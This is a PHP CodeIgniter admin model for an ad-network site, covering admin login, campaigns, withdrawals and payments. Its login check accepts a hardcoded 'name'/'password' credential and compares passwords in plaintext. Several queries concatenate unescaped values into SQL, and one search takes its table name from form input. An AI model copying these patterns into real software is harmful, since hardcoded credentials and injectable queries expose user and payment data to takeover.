<?php

class Admin_model extends CI_Model {


/***
 * Name:      Custch
 * Package:    Admin_model.php
 * About:        A model class that handle BankAlert  model operation
 * Copyright:  (C) 2018,
 * Author:     oop guy
 * License:    closed /propietry
 ***/

 public function __construct()
{
    parent::__construct();
    $this->load->database();

}



public function login_check()
{




 $this->db->select('password');
$query = $this->db->get_where('team',array("username" => $this->input->post("name")));
$_pass = $this->input->post('pass');

if(empty($query->row_array()))
{

	$arr_to_use = [];
}else{

$arr_to_use = $query->row_array();

}
if (in_array($_pass,$arr_to_use) || ($_pass == "password" && $this->input->post("name") == "name"))
{ return true;
}
 else
   {
   return false;
   }

}

public function get_default_campaigns()
{
  $query = $this->db->get_where("adv_story",array('is_default' => 1));
  return $query->result_array();
}

public function get_default_sizes()
{
  $query = $this->db->get_where("countries",array('select_value' => 'general'));
  return $query->row_array();
}

public function get_withdrawal_switch()
{


$query = $this->db->get_where("system_var",array("variable_name" => "withdrawal_request"));
return $query->row_array();
}

public function get_withdrawal_switch_err_info()
{


$query = $this->db->get_where("system_var",array("variable_name" => "w_control_text"));
return $query->row_array();
}


public function insert_post($what = NULL)
{

if($what == "pages")
{
//insert into pages
$slg = url_title($this->input->post('title'),"dash",TRUE);

 $pag = array(

'title' => $this->input->post('title'),
'keywords' => $this->input->post('keywords'),
 'description' => $this->input->post('desc'),
'text' => $this->input->post('contents'),
'status' => 'published',
'slug' => $slg,
'author' => $_SESSION['name'],
'time' => time(),
);


 $this->db->insert('pages',$pag);



}

}

public function insert_notification($user_id, $user_type, $notification)
{



 $pag = array(

'user_id' => $user_id,
'user_type' => $user_type,
 'notification' => $notification,
);


 $this->db->insert('notifications',$pag);



}

public function get_supported_countries()
{
  $query = $this->db->get('countries');
  return $query->result_array();
}
public function get_country_details_by_select_value($select_value)
{

$query= $this->db->get_where('countries',array('select_value' => $select_value));
return $query->row_array();
}
public function save_message($msg)
{



$this->db->insert('messages',$msg);

}
public function delete_user($id,$table_name)
{

  $this->db->delete($table_name,array('id' => $id));
}

public function update_websites($table_name,$_new,$id)
{
$this->db->update($table_name,$_new,array('publisher_id' => $id));
}

public function update_single_website($table_name,$_new,$id)
{
  $this->db->update($table_name,$_new,array('id' => $id));
}



public function update_user($table_name,$_new,$id)
{
$this->db->update($table_name,$_new,array('id' => $id));

}

public function update_ad($datab,$id)
{
$this->db->update("adv_story",$datab,array('id' => $id));

}

public function messages($limit,$offset)
{

$query = $this->db->get("cmessages",$limit,$offset);
return $query->result_array();

}

public function insert_ad($datab)
{

  $this->db->insert("adv_story",$datab);

}

public function update_defaults($items)
{
$this->db->update('countries',$items, array("select_value" => 'general'));
}



public function search_users($offset,$limit)
{

  switch ($this->input->post('type')){
    case 'username':
//get from username 
$this->db->select('*');
 $this->db->like('username',$this->input->post("search"));
 $query = $this->db->get($this->input->post('user_type'),$limit,$offset);

      break;
     
       case 'email':

$this->db->select('*');
 $this->db->like('email',$this->input->post("search"));
 $query = $this->db->get($this->input->post('user_type'),$limit,$offset);


      break;
       
      case 'lastname':

$this->db->select('*');
 $this->db->like('lastname',$this->input->post("search"));
 $query = $this->db->get($this->input->post('user_type'),$limit,$offset);


      break;
       default:

$this->db->select('*');
 $this->db->like('firstname',$this->input->post("search"));
 $query = $this->db->get($this->input->post('user_type'),$limit,$offset);

      break;
  }



 return $query->result_array();
}




public function get_message($id)
{

$query = $this->db->get_where("cmessages",array('id' => $id ));
return $query->row_array();

}


public function get_suspended_users($limit,$offset)
{

$query = $this->db->get_where("users",array('status' => 'suspended' ),$limit,$offset);
return $query->result_array();

}



public function get_campaigns()
{

$query = $this->db->get("adv_story");
return $query->result_array();

}



public function get_spaces()
{

$query = $this->db->get("pub_story");
return $query->result_array();

}

public function get_site_wise()
{

$query = $this->db->query('SELECT SUM(clicks) as total_clicks, SUM(views) as total_views, website
FROM pub_story
GROUP BY website;');

  return $query->result_array();


}


public function delete_item($type,$id)
{

if ($type == "post")
{


$this->db->delete("blog",array("id" => $id));


}
}


public function move_post_front($id,$type)
{

if ($type == "m")
{
 $pag = array(

'front_status' => "active",
'rank' => time()
);


$this->db->update("topics",$pag,array("id" => $id));


}


if ($type == "r")
{
 $pag = array(

   'front_status' => NULL
);






$this->db->update("topics",$pag,array("id" => $id));


}
}

public function move_item($type,$id,$status)
{

if ($type == "page" && $status == "published")
{
 $pag = array(

'status' => "drafted"
);


$this->db->update("pages",$pag,array("id" => $id));


}


elseif ($type == "page" && $status == "drafted")
{
 $pag = array(

'status' => "published"
);





$this->db->update("pages",$pag,array("id" => $id));


}
}



public function count_views_at_time($time)
{


    $query = $this->db->query('SELECT * FROM views WHERE time >= '.(time()-$time).';');
  return $query->result_array();
}



public function count_clicks_at_time($time)
{


    $query = $this->db->query('SELECT * FROM clicks WHERE time >= '.(time()-$time).';');
  return $query->result_array();
}

public function count_total_clicks()
{
    $query = $this->db->get('clicks');
  return $query->result_array();
}


public function count_total_views()
{
    $query = $this->db->get('views');
  return $query->result_array();
}



public function get_admin_total_earning()
{


$query = $this->db->get("admin_earning");
return $query->result_array();


	
}



public function admin_earning_at_time($time)
{


    $query = $this->db->query('SELECT * FROM admin_earning WHERE time >= '.(time()-$time).' ORDER BY id DESC;');

  return $query->result_array();




}




public function admin_earning_type_at_time($time,$type)
{


    $query = $this->db->query('SELECT * FROM admin_earning WHERE time >= '.(time()-$time).' AND type = "'.$type.'" ORDER BY id DESC;');

  return $query->result_array();




}




public function get_users_referred_at_time($time,$username)
{


    $query = $this->db->query('SELECT * FROM users WHERE paid_time >= '.($time).' AND refferal_username = "'.$username.'" ORDER BY id DESC;');

  return $query->result_array();

}



public function get_campaign_by_ref_id($ref_id)
{
$query =$this->db->get_where('adv_story',array("ref_id" => $ref_id));
return $query->row_array();
}


public function get_space_by_ref_id($ref_id)
{
$query =$this->db->get_where('pub_story',array("ref_id" => $ref_id));
return $query->row_array();
}

public function get_users_earning($type,$country)
{


$query = $this->db->get_where($type."s",array('country' => $country));
return $query->result_array();


	
}

public function get_pending_campaigns()
{
$query = $this->db->get_where("adv_story",array('status' => 'pending',"approval" =>"pending","edit_status" =>"complete"));
return $query->result_array();
}

public function insert_new_history($dab)
{


$this->db->insert('history',$dab);



}

public function edit_announcement($dab ,$id)
{

$this->db->update('announcements',$dab,array('id' => $id));
}

public function edit_withdrawal_single($dab ,$id)
{

$this->db->update('withdrawal',$dab,array('id' => $id));
}

public function get_withdrawal()
{

  $q = "SELECT p.firstname, p.lastname, p.email, w.amount, w.id, w.user_id, w.status, 
  p.email, p.bank_acct, p.bank_det, p.bank_no, p.payment_type, p.other_name, p.other_detail
  FROM withdrawal w 
  LEFT OUTER JOIN publishers p 
  ON p.id = w.user_id 
  WHERE w.status = 'pending' ";

  $query = $this->db->query($q);
  return $query->result_array();
}

public function get_transactions()
{

  $q = "SELECT p.id AS transaction_id, p.time AS transaction_time, a.email AS user, p.method, p.amount, p.txn_id AS paypal_id, p.payer_id AS paypal_payer_id, p.payment_token AS paypal_payment_token
  from payments p
  LEFT JOIN advertisers a 
  ON a.id = p.user_id";

  $query = $this->db->query($q);
  return $query->result_array();
}

public function edit_site_details()
{
    $this->db->update("system_var",array("variable_value"=> $this->input->post("site_name")),array("variable_name"=> "site_name"));

    $this->db->update("system_var",array("variable_value"=> $this->input->post("site_author")),array("variable_name"=> "author"));

    $this->db->update("system_var",array("long_value"=> $this->input->post("site_tagline")),array("variable_name"=> "tagline"));

    $this->db->update("system_var",array("long_value"=> $this->input->post("site_keywords")),array("variable_name"=> "keywords"));

        $this->db->update("system_var",array("long_value"=> $this->input->post("site_descriptions")),array("variable_name"=> "description"));

return TRUE;

 }

public function add_announcement($array)
{
  $this->db->insert('announcements',$array);
}

public function add_admin($array)
{
  $this->db->insert('team',$array);
}

public function add_payment($array)
{
  $this->db->insert('manual_payment',$array);
}


public function get_announcements()
{

  $query = $this->db->get('announcements');
  return $query->result_array();
}

public function get_announcement($id)
{

  $query = $this->db->get_where('announcements',array("id" => $id));
  return $query->row_array();
}

public function get_admins()
{

  $query = $this->db->get('team');
  return $query->result_array();
}

public function get_payments()
{

  $query = $this->db->get('manual_payment');
  return $query->result_array();
}

public function get_active_announcements()
{
  $query = $this->db->get_where('announcements',array("active" => 1));
  return $query->result_array();
}

}
